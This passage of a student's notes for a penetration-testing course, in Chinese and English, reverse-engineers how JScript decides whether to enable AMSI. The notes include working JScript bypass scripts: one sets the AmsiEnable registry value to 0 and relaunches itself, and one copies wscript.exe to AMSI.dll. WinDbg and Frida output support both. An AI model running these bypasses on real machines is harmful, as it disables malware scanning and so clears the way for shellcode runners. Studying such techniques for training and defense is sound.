00007fff`a3a86905 85c0            test    eax,eax
00007fff`a3a86907 754b            jne     jscript!JAmsi::JAmsiIsEnabledByRegistry+0x90 (00007fff`a3a86954)
00007fff`a3a86909 488b4c2458      mov     rcx,qword ptr [rsp+58h]
00007fff`a3a8690e 488d442440      lea     rax,[rsp+40h]
00007fff`a3a86913 4889442428      mov     qword ptr [rsp+28h],rax
00007fff`a3a86918 4c8d4c2448      lea     r9,[rsp+48h]
00007fff`a3a8691d 488d442450      lea     rax,[rsp+50h]
00007fff`a3a86922 c744244004000000 mov     dword ptr [rsp+40h],4
00007fff`a3a8692a 4533c0          xor     r8d,r8d
00007fff`a3a8692d 4889442420      mov     qword ptr [rsp+20h],rax
00007fff`a3a86932 488d1587cb0800  lea     rdx,[jscript!`string' (00007fff`a3b134c0)]
00007fff`a3a86939 ff15b1a60800    call    qword ptr [jscript!_imp_RegQueryValueExW (00007fff`a3b10ff0)]
00007fff`a3a8693f 488b4c2458      mov     rcx,qword ptr [rsp+58h]
00007fff`a3a86944 8bd8            mov     ebx,eax
00007fff`a3a86946 ff158ca60800    call    qword ptr [jscript!_imp_RegCloseKey (00007fff`a3b10fd8)]
00007fff`a3a8694c 85db            test    ebx,ebx
00007fff`a3a8694e 0f84144e0200    je      jscript!JAmsi::JAmsiIsEnabledByRegistry+0x24ea4 (00007fff`a3aab768)
00007fff`a3a86954 b001            mov     al,1
```
> 從 Assembly 找到 Registry Path
> - call RegOpenKeyExW 而 RegOpenKeyExW 的第二個參數位於 RDX
> ```dbg
> rdx = 7fff`a3b134e0
> ```
> a3b134e0 不是 Registry path，是儲存 Registry path 字串的記憶體位址
> - du 00007fff a3b134e0 取得 "SOFTWARE\Microsoft\Windows Script\Settings"
>```
>RDX
> ↓
>0x7fff`a3b134e0
> ↓
>du
> ↓
>"SOFTWARE\Microsoft\Windows Script\Settings"
>```
>
> > Windows x64 calling convention:
> > ```
> > 第一個 argument → RCX
> > 第二個 argument → RDX
> > 第三個 argument → R8
> > 第四個 argument → R9
> > ```

Reverse Engineering 根本 Web 仔的地獄 🥵\
![image](https://hackmd.io/_uploads/rJ3oG3D5Gl.png)

highlighted call Win32 [RegOpenKeyExW](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexw) & [RegQueryValueExW](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvalueexw)  API
```dbg
0:000> du 00007fff`a3b134e0
00007fff`a3b134e0  "SOFTWARE\Microsoft\Windows Scrip"
00007fff`a3b13520  "t\Settings"

0:000> du 7fff`a3b134c0
00007fff`a3b134c0  "AmsiEnable"
```

利用 WScript.Shell 寫入 Registry
```javascript
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
sh.RegWrite(key, 0, "REG_DWORD");
```
> 把 AmsiEnable 寫成 0

Frida 分析：
```powershell
C:\Users\Offsec> frida-trace -p 5772  -x amsi.dll -i Amsi*
Instrumenting functions...
AmsiOpenSession: Loaded handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiOpenSession.js"
AmsiUninitialize: Loaded handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUninitialize.js"
AmsiScanBuffer: Loaded handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiScanBuffer.js"
AmsiUacInitialize: Loaded handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUacInitialize.js"
AmsiInitialize: Loaded handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiInitialize.js"
AmsiCloseSession: Loaded handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiCloseSession.js"
AmsiScanString: Loaded handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiScanString.js"
AmsiUacUninitialize: Loaded handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUacUninitialize.js"
AmsiUacScan: Loaded handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUacScan.js"
Started tracing 9 functions. Press Ctrl+C to stop.
Process terminated
```
> Frida 總共 hook 了 9 個 AMSI functions。但是最後 Process terminated\
> 沒有 `AmsiScanBuffer`, `AmsiScanString` 呼叫紀錄

雖然成功繞過，但僅在 wscript.exe 啟動之前設定了  registry key 的情況下才有效\
👉🏻 透過新增對AmsiEnable registry key 的檢查來改進方法。如果該 registry 存在，可以嘗試執行 shellcode runner，若不存在，將建立並再次執行 Jscript。
```JScript
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
try{
	var AmsiEnable = sh.RegRead(key);
	if(AmsiEnable!=0){
	throw new Error(1, '');
	}
}catch(e){
	sh.RegWrite(key, 0, "REG_DWORD");
	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);
	sh.RegWrite(key, 1, "REG_DWORD");
	WScript.Quit(1);
}
```
> - `-e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58}`: -e 指定哪一個 scripting engine 要處理 script (HKLM\SOFTWARE\Classes\CLSID)

用新的 process 把 initialization timing 重新跑一次
```
Registry = 0
       ↓
建立新的 script process
       ↓
新的 process 啟動
       ↓
讀取 AmsiEnable = 0
       ↓
不初始化 AMSI
```
![image](https://hackmd.io/_uploads/r1u3rhD9zl.png)


Work Flow:
```
JScript
   │
   ▼
wscript.exe 啟動
   │
   ▼
Jscript.dll
   │
   ▼
JAmsi::JAmsiIsEnabledByRegistry
   │
   ▼
RegOpenKeyExW
   │
   ▼
HKCU\Software\Microsoft\Windows Script\Settings
   │
   ▼
RegQueryValueExW
   │
   ▼
AmsiEnable
   │
   ├── 0 ──► 不啟用 AMSI
   │
   └── 非 0 / 不存在
            │
            ▼
        設定 AmsiEnable = 0
            │
            ▼
        啟動新的 cscript.exe
            │
            ▼
        新 process 重新初始化
            │
            ▼
        AmsiEnable = 0
            │
            ▼
        AMSI 不啟用
```
### I Am My Own Executable
PowerShell 主要思路是修改 AMSI API，而 JScript 透過設定 registry key 來停用 AMSI

雖然 PowerShell 直接覆寫 AMSI.DLL 似乎有邏輯，但需要管理員權限才能覆蓋 `C:\Windows\System32` 目錄下的任何檔案
👉🏻 也可以透過利用 DLL 搜尋順序來執行 [DLL hijacking attack](https://attack.mitre.org/techniques/T1038/) 

1. 先確認 AMSI.DLL 什麼時候載入
```dbg
0:000> lm m amsi
Browse full module list
start             end  
```
> AMSI.DLL 尚未載入

2. 中斷系統載入
```dbg
0:000> sxe ld amsi

0:000> g
ModLoad: 00007fff`d3350000 00007fff`d337e000   C:\Windows\System32\IMM32.DLL
ModLoad: 00007fff`cf4d0000 00007fff`cf4e1000   C:\Windows\System32\kernel.appcore.dll
ModLoad: 00007fff`cdad0000 00007fff`cdb6c000   C:\Windows\system32\uxtheme.dll
ModLoad: 00007fff`cf280000 00007fff`cf31b000   C:\Windows\SYSTEM32\sxs.dll
ModLoad: 00007fff`d2700000 00007fff`d286a000   C:\Windows\System32\MSCTF.dll
ModLoad: 00007fff`cdee0000 00007fff`cdf0e000   C:\Windows\system32\dwmapi.dll
ModLoad: 00007fff`d01b0000 00007fff`d038b000   C:\Windows\System32\CRYPT32.dll
ModLoad: 00007fff`cf4b0000 00007fff`cf4c2000   C:\Windows\System32\MSASN1.dll
ModLoad: 00007fff`cfd80000 00007fff`cfd97000   C:\Windows\System32\CRYPTSP.dll
ModLoad: 00007fff`d2b00000 00007fff`d2ba2000   C:\Windows\System32\clbcatq.dll
ModLoad: 00007fff`a3a70000 00007fff`a3b41000   C:\Windows\System32\jscript.dll
ModLoad: 00007fff`d3000000 00007fff`d3052000   C:\Windows\System32\SHLWAPI.dll
ModLoad: 00007fff`c6e20000 00007fff`c6e34000   C:\Windows\SYSTEM32\amsi.dll
ntdll!NtMapViewOfSection+0x14:
00007fff`d351ea94 c3              ret

0:000> lm m amsi
Browse full module list
start             end                 module name
00007fff`c6e20000 00007fff`c6e34000   amsi       (deferred)   
```
> WinDbg 在 amsi.dll 載入的瞬間停下來
> - `sxe` 設定 exception/event handling
> - `ld` 關注 module load
> - `amsi` 指定要注意的 module

3. Call Stack
k 查看 call stack
```dbg
0:000> k
 # Child-SP          RetAddr           Call Site
00 00000085`733ec8f8 00007fff`d34ca369 ntdll!NtMapViewOfSection+0x14
01 00000085`733ec900 00007fff`d34ca4b7 ntdll!LdrpMinimalMapModule+0x101
02 00000085`733ec9c0 00007fff`d34cbcfd ntdll!LdrpMapDllWithSectionHandle+0x1b
03 00000085`733eca20 00007fff`d34cd75a ntdll!LdrpMapDllNtFileName+0x189
04 00000085`733ecb20 00007fff`d34ce21f ntdll!LdrpMapDllSearchPath+0x1de
05 00000085`733ecd80 00007fff`d34c5496 ntdll!LdrpProcessWork+0x123
06 00000085`733ecde0 00007fff`d34c25e4 ntdll!LdrpLoadDllInternal+0x13e
07 00000085`733ece60 00007fff`d34c1874 ntdll!LdrpLoadDll+0xa8
08 00000085`733ed010 00007fff`cff40391 ntdll!LdrLoadDll+0xe4
09 00000085`733ed100 00007fff`a3a84ed8 KERNELBASE!LoadLibraryExW+0x161
0a 00000085`733ed170 00007fff`a3a84c6c jscript!COleScript::Initialize+0x2c
0b 00000085`733ed1a0 00007fff`d2cffda1 jscript!CJScriptClassFactory::CreateInstance+0x5c
...
```
找到 JScript 裡真正負責載入 AMSI.DLL 的 function
```
JScript
   ↓
COleScript::Initialize
   ↓
LoadLibraryExW
   ↓
AMSI.DLL
```

4. 反組譯 `COleScript::Initialize`
```dbg
0:000> u jscript!COleScript::Initialize LA
jscript!COleScript::Initialize:
00007fff`a3a84eac 48895c2418      mov     qword ptr [rsp+18h],rbx
00007fff`a3a84eb1 4889742420      mov     qword ptr [rsp+20h],rsi
00007fff`a3a84eb6 48894c2408      mov     qword ptr [rsp+8],rcx
00007fff`a3a84ebb 57              push    rdi
00007fff`a3a84ebc 4883ec20        sub     rsp,20h
00007fff`a3a84ec0 488bf9          mov     rdi,rcx
00007fff`a3a84ec3 33d2            xor     edx,edx
00007fff`a3a84ec5 41b800080000    mov     r8d,800h
00007fff`a3a84ecb 488d0ddee40800  lea     rcx,[jscript!`string' (00007fff`a3b133b0)]
00007fff`a3a84ed2 ff15d0c10800    call    qword ptr [jscript!_imp_LoadLibraryExW (00007fff`a3b110a8)]

0:000> du 7fff`a3b133b0
00007fff`a3b133b0  "amsi.dll"
```

可以還原成接近 `LoadLibraryExW("amsi.dll", ...)`
>[!Tip]
>利用 [DLL search order](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order) 特性，進行 DLL hijacking
>```
>amsi.dll
>       ↓
>Windows 搜尋 DLL
>       ↓
>如果攻擊者可以控制搜尋路徑
>       ↓
>可能載入另一個 DLL
>```

🥚 [LoadLibraryExW](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexw) function 不是單純 LoadLibrary(...) 還有第三個參數，mov r8d,800h 也就是 R8 = 0x800\
等同於 LOAD_LIBRARY_SEARCH_SYSTEM32 強制搜尋 C:\Windows\System32

5. James Forshaw 的另一個思路
"[discovered an interesting way around this](https://tyranidslair.blogspot.com/2018/06/disabling-amsi-in-jscript-with-one.html)": 重新命名 wscript.exe 成為 amsi.dll

當 process 本身的名稱是 amsi.dll，又嘗試載入 amsi.dll 時：\
Windows loader 可能認為 amsi.dll 已經在 process 裡
因此不再重新載入同名 DLL

.dll 不是 executable 不能直接執行。且 CreateProcess 會解析 executable file header
👉🏻 `WScript.Shell.Exec` 作為 wrapper

建立 C:\Windows\Tasks\AMSI.dll 實際上是 wscript.exe 的 copy
```JScript
var filesys= new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');
try
{
	if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
	{
		throw new Error(1, '');
	}
}
catch(e)
{
	filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
	sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName);
	WScript.Quit(1);
}
```
Windows Defender 發現 amsi.dll 是新的 process，且把 shell kill 掉\
![image](https://hackmd.io/_uploads/Hy5gshP5fg.png)

雖然觸發 Windows Defender 會失去 stealth element，但這種繞過方法可以對抗所有支援 AMSI 的防毒廠商

# Application Whitelisting

>[!Caution]
> HackMD 筆記長度限制，接續 [[OSEP, PEN-300] Instructional notes - Part 5](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-5/)

# [Link to: "[OSEP, PEN-300] Instructional notes - Part 5"](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-5/)

# [Link to: "[OSEP, PEN-300] Instructional notes - Part 6"](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-6/)
